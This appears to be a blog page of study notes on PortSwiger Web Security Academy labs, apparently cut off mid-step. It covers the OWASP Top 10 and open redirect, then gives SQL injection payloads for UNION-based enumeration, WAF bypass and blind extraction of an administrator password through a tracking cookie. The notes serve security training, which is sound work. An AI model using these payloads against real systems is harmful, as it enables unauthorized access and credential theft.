<!DOCTYPE HTML>
<html lang="en">




<head>
    <meta charset="utf-8">
    <meta name="keywords" content="PortSwiger, Hunter|Hacker|Coder|Artist">
    <meta name="description" content="信念与认知">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->

<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', '');
</script>


    <title>PortSwiger | Jf71o0x1o1l</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Jf71o0x1o1l" type="application/atom+xml">
</head>


    

                <body>
                    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Jf71o0x1o1l</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>Index</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>Tags</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>Categories</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>Archives</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>About</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>Contact</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>Friends</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Jf71o0x1o1l</div>
        <div class="logo-desc">
            
            信念与认知
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			Index
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			Tags
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			Categories
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			Archives
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			About
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			Contact
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			Friends
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

                        



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">PortSwiger</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/Web/">
                                <span class="chip bg-color">Web</span>
                            </a>
                        
                            <a href="/tags/Lab/">
                                <span class="chip bg-color">Lab</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/Cybersecurity/" class="post-category">
                                Cybersecurity
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
                    2023-03-06
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
                    2024-01-13
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
                    47k
                </div>
                

                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h3 id="top-10-web-application-security-risks">Top 10 Web Application
Security Risks</h3>
<ol type="1">
<li><a
target="_blank" rel="noopener" href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/"><strong>A01:2021-Broken
Access Control</strong></a></li>
<li><a
target="_blank" rel="noopener" href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/"><strong>A02:2021-Cryptographic
Failures</strong></a></li>
<li><a
target="_blank" rel="noopener" href="https://owasp.org/Top10/A03_2021-Injection/"><strong>A03:2021-Injection</strong></a></li>
<li><a
target="_blank" rel="noopener" href="https://owasp.org/Top10/A04_2021-Insecure_Design/"><strong>A04:2021-Insecure
Design</strong></a></li>
<li><a
target="_blank" rel="noopener" href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"><strong>A05:2021-Security
Misconfiguration</strong></a></li>
<li><a
target="_blank" rel="noopener" href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"><strong>A06:2021-Vulnerable
and Outdated Components</strong></a></li>
<li><a
target="_blank" rel="noopener" href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"><strong>A07:2021-Identification
and Authentication Failures</strong></a></li>
<li><a
target="_blank" rel="noopener" href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"><strong>A08:2021-Software
and Data Integrity Failures</strong></a></li>
<li><a
target="_blank" rel="noopener" href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/"><strong>A09:2021-Security
Logging and Monitoring Failures</strong></a></li>
<li><a
target="_blank" rel="noopener" href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/"><strong>A10:2021-Server-Side
Request Forgery</strong></a></li>
</ol>
<h3 id="open-redirect">Open Redirect</h3>
<ol type="1">
<li>As applications increasingly use <code>external data sources</code>,
there's an increasing need to secure URL redirection.</li>
<li>By performing a redirect, attackers can steal users' credentials,
redirect users to <code>phishing sites</code>, and do more malicious
things.</li>
<li>Open redirection (open redirect) is classified as one of <strong>two
types</strong>: header- and JavaScript-based, also known as type I and
type II open redirect.</li>
<li>Once a hacker finds and exploits this vulnerability, it's no longer
just a matter of redirection. He can perform
<code>phishing attacks</code>,
<code>cross-site scripting attacks</code>, and even
<code>server-side request forgery attacks</code>.</li>
</ol>
<h3 id="out-of-band-application-security-testing-oast">Out-of-band
application security testing (OAST)</h3>
<ol type="1">
<li>带外应用程序安全测试 (OAST) 使用<strong>外部服务器</strong>来查看
其他不可见的漏洞</li>
</ol>
<h3 id="sqli">Sqli</h3>
<h4 id="what-is-sql-injection">What is Sql injection</h4>
<h5
id="lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">Lab:
SQL injection vulnerability in WHERE clause allowing retrieval of hidden
data</h5>
<ol type="1">
<li><p>payload<img
src="https://s2.loli.net/2023/07/12/Y5e4MyjpwvL8nOg.png"
alt="image-20230712102850380" /></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">/</span><span class="token builtin">filter</span>?category<span class="token operator">=</span>'<span class="token operator">+</span><span class="token keyword">or</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">+=</span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">-</span></code></pre></li>
</ol>
<h5 id="lab-sql-injection-vulnerability-allowing-login-bypass">Lab: SQL
injection vulnerability allowing login bypass</h5>
<ol type="1">
<li>burp 拦截，在确定用户名通过的前提下并注释掉后面的密码审核部分<img
src="https://s2.loli.net/2023/07/12/dfXSQqLMvhAHsYJ.png"
alt="image-20230712105439083" /></li>
</ol>
<hr />
<ul>
<li>二次sql注入</li>
</ul>
<h5 id="lab-sql-injection-with-filter-bypass-via-xml-encoding">Lab: SQL
injection with filter bypass via XML encoding</h5>
<ul>
<li>Hackvertor插件<img
src="https://s2.loli.net/2023/07/12/t54TKlFbzwaugUd.png"
alt="image-20230712115731699" /></li>
</ul>
<ol type="1">
<li>试探性请求，被检测到sql注入<img
src="https://s2.loli.net/2023/07/12/4OTaqxoYblrVsUL.png"
alt="image-20230712142940227" /></li>
<li>进行十六进制实体编码的目的是<strong>绕过</strong>Web应用程序防火墙（WAF）或其他安全机制的检测
<ol type="1">
<li>选中payload<img
src="https://s2.loli.net/2023/07/12/1vOd6QX2N7fbAkp.png"
alt="image-20230712143109937" /></li>
<li>爆出用户名和密码<img
src="https://s2.loli.net/2023/07/12/49CyqUjMi6EmFQ7.png"
alt="image-20230712143152966" /></li>
</ol></li>
</ol>
<h5 id="how-to-prevent-sql-injection">How to prevent SQL injection</h5>
<ul>
<li>prepared statements</li>
</ul>
<h4 id="examining-the-database-in-sql-injection-attacks">Examining the
database in SQL injection attacks</h4>
<h5 id="querying-the-database-type-and-version">Querying the database
type and version</h5>
<ul>
<li><table>
<thead>
<tr class="header">
<th>Database type</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Microsoft, MySQL</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr class="even">
<td>Oracle</td>
<td><code>SELECT * FROM v$version</code></td>
</tr>
<tr class="odd">
<td>PostgreSQL</td>
<td><code>SELECT version()</code></td>
</tr>
</tbody>
</table></li>
<li><p>example:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> @<span class="token variable">@version</span><span class="token comment">--</span></code></pre></li>
</ul>
<h5
id="lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">Lab:
SQL injection attack, querying the database type and version on
Oracle</h5>
<ul>
<li><p>在<code>Oracle</code>数据库中，每个SELECT语句都必须指定要从中选择的表,即使目的只是为了返回一些静态值或字符串。</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token string">'abc'</span> <span class="token keyword">FROM</span> dual</code></pre></li>
</ul>
<ol type="1">
<li><p>Determine the <strong>number of columns</strong> that are being
returned by the query and which columns <strong>contain text
data</strong><img
src="https://s2.loli.net/2023/07/13/iergKSzDkjnyxLc.png"
alt="image-20230713041444814" /></p></li>
<li><p>burp 上是静态页面，所以send 两次即可看到solved<img
src="https://s2.loli.net/2023/07/13/iergKSzDkjnyxLc.png"
alt="image-20230713041531099" /></p>
<p><strong>Payload分析</strong>：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token operator">+</span><span class="token keyword">UNION</span><span class="token operator">+</span><span class="token keyword">SELECT</span><span class="token operator">+</span>BANNER<span class="token punctuation">,</span><span class="token operator">+</span><span class="token boolean">NULL</span><span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span>v$version<span class="token comment">--</span></code></pre>
<p>这个SQL语句是一个UNION
SELECT攻击的示例，用于从Oracle数据库的v$version视图中检索版本信息。让我们逐步解析这个语句：</p>
<ol type="1">
<li>' 是一个单引号，用于将后面的字符串作为文本值。</li>
<li>UNION
是用于将两个或多个SELECT语句的结果合并为一个结果集的关键字。</li>
<li>SELECT BANNER, NULL
是第一个SELECT语句，它选择了v$version视图中的BANNER列和一个空值(NULL)作为第二列。</li>
<li><code>FROM v$version</code> 指定了要从
v$version视图中选择数据。</li>
<li>--
是注释符号，用于注释掉后面的任何文本，使其不会被数据库解析为有效的SQL代码。</li>
</ol>
<p>通过将这个SQL语句发送给Oracle数据库，它将执行UNION操作并将v$version视图中的版本信息与空值进行组合。</p></li>
</ol>
<h5
id="lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">Lab:
SQL injection attack, querying the database type and version on MySQL
and Microsoft</h5>
<ol type="1">
<li><p>Payload</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token operator">+</span><span class="token keyword">UNION</span><span class="token operator">+</span><span class="token keyword">SELECT</span><span class="token operator">+</span>@<span class="token variable">@version</span><span class="token punctuation">,</span><span class="token operator">+</span><span class="token boolean">NULL</span><span class="token comment">#</span></code></pre></li>
</ol>
<h5
id="lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">Lab:
SQL injection attack, listing the database contents on non-Oracle
databases</h5>
<ol type="1">
<li><p>爆表</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token operator">+</span><span class="token keyword">UNION</span><span class="token operator">+</span><span class="token keyword">SELECT</span><span class="token operator">+</span>table_name<span class="token punctuation">,</span><span class="token operator">+</span><span class="token boolean">NULL</span><span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment">--</span></code></pre></li>
<li><p>爆列</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='</span>users_abcdef'<span class="token comment">--</span></code></pre></li>
<li><p>指定内容</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token operator">+</span><span class="token keyword">UNION</span><span class="token operator">+</span><span class="token keyword">SELECT</span><span class="token operator">+</span>username_abcdef<span class="token punctuation">,</span><span class="token operator">+</span>password_abcdef<span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span>users_abcdef<span class="token comment">--</span></code></pre></li>
</ol>
<ul>
<li><p>找对表，应该是<img
src="https://s2.loli.net/2023/07/13/NM9qcP3QV57wRSC.png"
alt="image-20230713045743852" /></p></li>
<li><p>以下是<code>Oracle</code>版本</p>
<ol type="1">
<li><p>Use the following payload to retrieve the list of tables in the
database:</p>
<pre class="language-none"><code class="language-none">&#39;+UNION+SELECT+table_name,NULL+FROM+all_tables--</code></pre></li>
<li><p>Use the following payload (replacing the table name) to retrieve
the details of the columns in the table:</p>
<pre class="language-none"><code class="language-none">&#39;+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name&#x3D;&#39;USERS_ABCDEF&#39;--</code></pre></li>
<li><p>Use the following payload (replacing the table and column names)
to retrieve the usernames and passwords for all users:</p>
<pre class="language-none"><code class="language-none">&#39;+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--</code></pre></li>
</ol></li>
</ul>
<h4 id="sql-injection-union-attacks">SQL injection UNION attacks</h4>
<ul>
<li><p>为了使UNION查询生效，必须满足两个关键要求：</p>
<ol type="1">
<li>各个查询必须返回相同数量的列。</li>
<li>每列的数据类型必须在各个查询之间兼容。</li>
</ol>
<p>要进行SQL注入的UNION攻击，您需要确保您的攻击满足这两个要求。这通常涉及以下几个方面：</p>
<ol type="1">
<li>原始查询返回了多少列？</li>
<li>原始查询返回的哪些列的数据类型适合容纳注入查询的结果？</li>
</ol></li>
<li><p><code>ORDER BY子句</code>可以通过它们的索引来指定列，因此你不需要知道任何列的名称。当指定的列索引超过结果集中实际列的数量时，数据库会返回一个错误</p></li>
<li><p>在<code>MySQL</code>上，双破折号序列后必须跟一个空格。另外，井号字符#也可以用于表示注释。</p></li>
</ul>
<h4 id="blind-sql-injection">Blind SQL injection</h4>
<h5 id="lab-blind-sql-injection-with-conditional-responses">Lab: Blind
SQL injection with conditional responses</h5>
<ul>
<li>利用Cookie中的TrackId</li>
</ul>
<ol type="1">
<li><p>Modify the <code>TrackingId</code> cookie, changing it to:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">' AND '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span></code></pre>
<p>Verify that the "Welcome back" message appears in the
response.</p></li>
<li><p>Now change it to:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">' AND '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">2</span></code></pre>
<p>Verify that the "Welcome back" message does not appear in the
response. This demonstrates how you can test a single boolean condition
and infer the result.</p></li>
<li><p>Now change it to:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">' AND (SELECT '</span>a<span class="token string">' FROM users LIMIT 1)='</span>a</code></pre>
<p>Verify that the condition is true, confirming that there is a table
called <code>users</code>.</p></li>
<li><p>Now change it to:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">' AND (SELECT '</span>a<span class="token string">' FROM users WHERE username='</span>administrator<span class="token string">')='</span>a</code></pre>
<p>Verify that the condition is true, confirming that there is a user
called <code>administrator</code>.</p></li>
<li><p>The next step is to determine how many characters are in the
password of the <code>administrator</code> user. To do this, change the
value to:</p>
<pre class="language-none"><code class="language-none">TrackingId&#x3D;xyz&#39; AND (SELECT &#39;a&#39; FROM users WHERE username&#x3D;&#39;administrator&#39; AND LENGTH(password)&gt;1)&#x3D;&#39;a</code></pre>
<p>This condition should be true, confirming that the password is
greater than 1 character in length.</p></li>
<li><p>After determining the length of the password, the next step is to
test the character at each position to determine its value. This
involves a much larger number of requests, so you need to use
<code>Burp Intruder</code>. Send the request you are working on to Burp
Intruder, using the context menu.</p></li>
<li><p>In the Positions tab of Burp Intruder, change the value of the
cookie to:</p>
<pre class="language-none"><code class="language-none">TrackingId&#x3D;xyz&#39; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username&#x3D;&#39;administrator&#39;)&#x3D;&#39;a</code></pre>
<p>This uses the <code>SUBSTRING()</code> function to extract a single
character from the password, and test it against a specific value. Our
attack will cycle through each position and possible value, testing each
one in turn.</p></li>
<li><p>Place payload position markers around the final <code>a</code>
character in the cookie value. To do this, select just the
<code>a</code>, and click the "Add §" button. You should then see the
following as the cookie value (note the payload position markers):</p>
<pre class="language-none"><code class="language-none">TrackingId&#x3D;xyz&#39; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username&#x3D;&#39;administrator&#39;)&#x3D;&#39;§a§</code></pre></li>
<li><p>To test the character at each position, you'll need to send
suitable payloads in the payload position that you've defined. You can
assume that the password contains only lowercase alphanumeric
characters. Go to the Payloads tab, check that "<strong>Simple
list</strong>" is selected, and under <strong>Payload settings</strong>
add the payloads in the range a - z and 0 - 9. You can select these
easily using the "Add from list" drop-down.</p></li>
<li><p>To be able to tell when the correct character was submitted,
you'll need to grep each response for the expression "Welcome back". To
do this, go to the <strong>Settings</strong> tab, and the "<strong>Grep
- Match</strong>" section. Clear any existing entries in the list, and
then add the value "Welcome back".</p></li>
<li><p>Launch the attack by clicking the "Start attack" button or
selecting "Start attack" from the Intruder menu.</p></li>
<li><p>Review the attack results to find the value of the character at
the first position. You should see a column in the results called
"Welcome back". One of the rows should have a tick in this column. The
payload showing for that row is the value of the character at the first
position.</p></li>
<li><p>Now, you simply need to re-run the attack for each of the other
character positions in the password, to determine their value. To do
this, go back to the main Burp window, and the Positions tab of Burp
Intruder, and change the specified offset from 1 to 2. You should then
see the following as the cookie value:</p>
<pre class="language-none"><code class="language-none">TrackingId&#x3D;xyz&#39; AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username&#x3D;&#39;administrator&#39;)&#x3D;&#39;a</code></pre></li>
<li><p>Launch the modified attack, review the results, and note the
character at the second offset.</p></li>
<li><p>Continue this process testing offset 3, 4, and so on, until you
have the whole password.</p></li>
<li><p>In the browser, click "My account" to open the login page. Use
the password to log in as the <code>administrator</code> user.</p></li>
</ol>
<h5 id="lab-blind-sql-injection-with-conditional-errors">Lab: Blind SQL
injection with conditional errors</h5>
<ol type="1">
<li><p>Modify the <code>TrackingId</code> cookie, appending a single
quotation mark to it:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz'</code></pre>
<p>Verify that an error message is received.</p></li>
<li><p>Now change it to two quotation
marks:<code>TrackingId=xyz''</code>Verify that the error disappears.
This suggests that a syntax error (in this case, the unclosed quotation
mark) is having a detectable effect on the response.</p></li>
<li><p>You now need to confirm that the server is interpreting the
injection as a SQL query i.e. that the error is a SQL syntax error as
opposed to any other kind of error. To do this, you first need to
construct a subquery using valid SQL syntax. Try submitting:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT '')||'</span></code></pre>
<p>In this case, notice that the query still appears to be invalid. This
may be due to the database type - try specifying a predictable table
name in the query:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT '' FROM dual)||'</span></code></pre>
<p>As you no longer receive an error, this indicates that the target is
probably using an Oracle database, which requires all
<code>SELECT</code> statements to explicitly specify a table
name.</p></li>
<li><p>Now that you've crafted what appears to be a valid query, try
submitting an invalid query while still preserving valid SQL syntax. For
example, try querying a non-existent table name:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT '' FROM not-a-real-table)||'</span></code></pre>
<p>This time, an error is returned. This behavior strongly suggests that
your injection is being processed as a SQL query by the
back-end.</p></li>
<li><p>As long as you make sure to always inject syntactically valid SQL
queries, you can use this error response to infer key information about
the database. For example, in order to verify that the
<code>users</code> table exists, send the following query:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</span></code></pre>
<p>As this query does not return an error, you can infer that this table
does exist. Note that the <code>WHERE ROWNUM = 1</code> condition is
important here to prevent the query from returning more than one row,
which would break our concatenation.</p></li>
<li><p>You can also exploit this behavior to test conditions. First,
submit the following query:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</span></code></pre>
<p>Verify that an error message is received.sql</p></li>
<li><p>Now change it to:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</span></code></pre>
<p>Verify that the error disappears. This demonstrates that you can
trigger an error conditionally on the truth of a specific condition. The
<code>CASE</code> statement tests a condition and evaluates to one
expression if the condition is true, and another expression if the
condition is false. The former expression contains a divide-by-zero,
which causes an error. In this case, the two payloads test the
conditions <code>1=1</code> and <code>1=2</code>, and an error is
received when the condition is <code>true</code>.</p></li>
<li><p>You can use this behavior to test whether specific entries exist
in a table. For example, use the following query to check whether the
username <code>administrator</code> exists:</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>xyz<span class="token string">'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='</span>administrator<span class="token string">')||'</span></code></pre>
<p>Verify that the condition is true (the error is received), confirming
that there is a user called <code>administrator</code>.</p></li>
<li><p>The next step is to determine how many characters are in the
password of the <code>administrator</code> user. To do this, change the
value to:</p>
